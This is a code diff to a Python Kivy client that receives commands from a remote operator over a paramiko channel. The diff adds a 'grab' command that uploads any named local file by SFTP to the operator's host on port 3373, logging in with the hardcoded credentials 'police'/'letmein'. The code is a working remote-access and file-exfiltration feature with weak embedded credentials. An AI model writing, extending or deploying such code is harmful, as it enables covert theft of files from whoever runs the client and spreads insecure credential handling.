@@ -7,8 +7,6 @@ import paramiko
 from kivy.app import App
 from kivy.lang import Builder
 from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.button import Button
-from kivy.uix.textinput import TextInput
 
 
 Builder.load_string('''
@@ -54,10 +52,30 @@ class Client(BoxLayout):
                     chan.send(str(os.getcwd()))
                 except:
                     chan.send('*** Error. Check directory')
+            elif 'grab' in command:
+                try:
+                    path = re.match(r'^grab (.*)$', command).group(1)
+                    t = threading.Thread(target=self._sftp,
+                                         args=(path,))
+                    t.start()
+                    chan.send('Successfully started copying')
+                except:
+                    chan.send('*** Error. Check paths')
             elif command == 'uname':
                 chan.send(str(os.uname()))
             else:
                 chan.send('*** Unrecognized command')
+
+    def _sftp(self, path):
+        transport = paramiko.Transport((self.hostname.text, 3373))
+        transport.connect(username='police', password='letmein')
+        sftp = paramiko.SFTPClient.from_transport(transport)
+        sftp.put(
+            os.path.join(os.getcwd(), path),
+            path,
+        )
+        sftp.close()
+        transport.close()
 
     def connect(self):
         t = threading.Thread(target=self._connect,
